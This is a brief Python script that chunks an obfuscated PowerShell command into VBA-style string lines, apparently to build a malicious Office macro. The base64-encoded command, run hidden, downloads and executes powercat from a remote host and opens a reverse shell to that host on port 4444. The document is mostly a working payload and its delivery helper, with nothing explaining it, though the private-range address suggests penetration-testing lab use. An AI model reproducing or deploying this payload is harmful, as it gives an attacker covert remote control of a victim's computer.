str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC40NS4yMjI6ODAwMC9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjQ1LjIyMiAtcCA0NDQ0IC1lIHBvd2Vyc2hlbGwK"

n = 50

for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
